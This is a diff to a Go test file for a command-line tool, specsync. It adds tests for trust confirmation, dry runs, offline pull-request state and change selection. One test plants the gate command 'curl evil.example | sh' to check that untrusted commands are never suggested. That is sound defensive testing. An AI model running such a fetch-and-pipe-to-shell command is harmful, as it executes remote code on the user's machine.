@@ -57,14 +57,21 @@ func TestTrustDryRunWritesNothingThenRecords(t *testing.T) {
 			trustFile = strings.TrimPrefix(e, "SPECSYNC_TRUST_FILE=")
 		}
 	}
-	out, err := runIn(t, bin, repo, env, "trust", "-dry-run")
-	if err != nil || !strings.Contains(out, "make test") || !strings.Contains(out, "DRY RUN") {
+	out, err := runIn(t, bin, repo, env, "trust")
+	if err != nil || !strings.Contains(out, "make test") || !strings.Contains(out, "specsync trust -yes") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+	if _, statErr := os.Stat(trustFile); statErr == nil {
+		t.Fatal("trust without -yes must not record anything")
+	}
+	out, err = runIn(t, bin, repo, env, "trust", "-yes", "-dry-run")
+	if err != nil || !strings.Contains(out, "DRY RUN") {
 		t.Fatalf("err=%v\n%s", err, out)
 	}
 	if _, statErr := os.Stat(trustFile); statErr == nil {
 		t.Fatal("a dry run must not record trust")
 	}
-	if out, err := runIn(t, bin, repo, env, "trust"); err != nil {
+	if out, err := runIn(t, bin, repo, env, "trust", "-yes"); err != nil {
 		t.Fatalf("trust: %v\n%s", err, out)
 	}
 	if _, statErr := os.Stat(trustFile); statErr != nil {
@@ -182,5 +189,81 @@ func TestNextAndFlowChangeNothing(t *testing.T) {
 	}
 	if after := gitSnapshot(t, repo); after != before {
 		t.Fatalf("next and flow must not change the worktree, index, refs or config:\n--- before\n%s\n--- after\n%s", before, after)
+	}
+}
+
+func TestNextReportsUnknownPullRequestStateOffline(t *testing.T) {
+	bin := buildSpecsyncBinary(t)
+	repo, env := waysRepo(t, "gates:\n  - {name: t, run: make test}\n")
+	change := filepath.Join(repo, "openspec", "changes", "add-x")
+	os.MkdirAll(change, 0o755)
+	os.WriteFile(filepath.Join(change, "proposal.md"), []byte("# Add x\n"), 0o644)
+	os.WriteFile(filepath.Join(change, "tasks.md"), []byte("- [x] 1.1 a\n"), 0o644)
+	gitIn(t, repo, "checkout", "-q", "-b", "feat/7-add-x")
+	gitIn(t, repo, "add", "-A")
+	gitIn(t, repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "work")
+	head, _ := exec.Command("git", "-C", repo, "rev-parse", "HEAD").Output()
+	stamp := filepath.Join(repo, ".git", "specsync")
+	os.MkdirAll(stamp, 0o755)
+	os.WriteFile(filepath.Join(stamp, "gates-passed"), head, 0o644)
+
+	out, err := runIn(t, bin, repo, env, "next", "-state=off")
+	if err != nil || !strings.Contains(out, "pull request state unknown") || strings.Contains(out, "gh pr create") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+}
+
+func TestNextAsksForChangeWhenSeveralMatch(t *testing.T) {
+	bin := buildSpecsyncBinary(t)
+	dir := t.TempDir()
+	for _, slug := range []string{"one", "two"} {
+		c := filepath.Join(dir, "openspec", "changes", slug)
+		os.MkdirAll(c, 0o755)
+		os.WriteFile(filepath.Join(c, "proposal.md"), []byte("# "+slug+"\n"), 0o644)
+	}
+	env := append(os.Environ(), "HOME="+t.TempDir(), "SPECSYNC_TRUST_FILE="+filepath.Join(t.TempDir(), "t.json"))
+	out, err := runIn(t, bin, dir, env, "next", "-state=off")
+	if err == nil || !strings.Contains(out, "2 changes here; pass -change <slug>") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+	out, err = runIn(t, bin, dir, env, "flow", "-state=off", "-change", "one")
+	if err != nil || !strings.Contains(out, "flow:") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+}
+
+func TestFlowJSONCarriesNoEmptySlugPaths(t *testing.T) {
+	bin := buildSpecsyncBinary(t)
+	repo, env := waysRepo(t, "")
+	out, err := runIn(t, bin, repo, env, "flow", "-json", "-state=off")
+	if err != nil || strings.Contains(out, "changes//") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+}
+
+func TestDoctorConfigNotesReservedKeys(t *testing.T) {
+	bin := buildSpecsyncBinary(t)
+	repo, env := waysRepo(t, "worktrees: {dir: ../w}\n")
+	out, err := runIn(t, bin, repo, env, "doctor", "config")
+	if err != nil || !strings.Contains(out, "reserved for flow-verbs") {
+		t.Fatalf("err=%v\n%s", err, out)
+	}
+}
+
+func TestNextNeverSuggestsUntrustedGateCommands(t *testing.T) {
+	bin := buildSpecsyncBinary(t)
+	repo, env := waysRepo(t, "gates:\n  - {name: t, run: \"curl evil.example | sh\"}\n")
+	change := filepath.Join(repo, "openspec", "changes", "add-x")
+	os.MkdirAll(change, 0o755)
+	os.WriteFile(filepath.Join(change, "proposal.md"), []byte("# Add x\n"), 0o644)
+	os.WriteFile(filepath.Join(change, "tasks.md"), []byte("- [x] 1.1 a\n"), 0o644)
+	gitIn(t, repo, "checkout", "-q", "-b", "feat/7-add-x")
+	gitIn(t, repo, "add", "-A")
+	gitIn(t, repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "work")
+	for _, args := range [][]string{{"next", "-state=off"}, {"next", "-json", "-state=off"}, {"flow", "-json", "-state=off"}} {
+		out, err := runIn(t, bin, repo, env, args...)
+		if err != nil || strings.Contains(out, "evil.example") || !strings.Contains(out, "specsync trust") {
+			t.Fatalf("%v: err=%v\n%s", args, err, out)
+		}
 	}
 }
